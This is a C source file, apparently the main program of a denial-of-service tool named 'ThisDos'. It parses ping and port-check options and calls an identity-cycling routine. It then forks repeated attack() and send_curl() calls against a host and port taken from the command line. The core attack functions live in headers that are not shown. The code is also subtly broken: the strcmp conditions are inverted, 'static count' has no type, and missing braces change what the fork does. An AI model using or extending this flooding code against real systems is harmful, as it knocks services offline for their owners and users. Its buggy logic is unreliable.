/*
This program is licensed under the GNU General Public License v3.
Copyright (C) 2007 Free Software Foundation, Inc. <https://fsf.org/>
See https://www.gnu.org/licenses/gpl-3.0.html for details.
*/
#ifdef __WIN32__
#warning "Running thisdos on the windows is not recommended,please visit the page https://github.com/HeisenbergCipherCracker/ThisDos to see the installation guide."
#endif
#include "libz/basedos.h"
#include "libz/common.h"
#include "libwebutil/ping.h"
#include "libwebutil/findport.h"
#include "libwebutil/libcurl.h"

#include <stdio.h>
#include <string.h>
#include <stdbool.h>


int main(int argc, char **argv) {
	print_program_banner();
	int x;
	for (int i = 0;i< argc;i++){
		if (strcmp(argv[i],"--ping")){
			ping_host(argv[1]);
			break;
		}if (strcmp(argv[i],"--check-port")){
			finder_of_ports(argc,argv,argv[1]);
			break;
		}


	}
	if(argc <3){
		cycle_identity();
	}
	for(x=0; x != THREADS; x++) {
		static count = 100;
		if(fork())
			attack(argv[1], argv[2], x);
			send_curl(argv[1],count--);
		usleep(250000);
	}
	getc(stdin);
	return 0;
}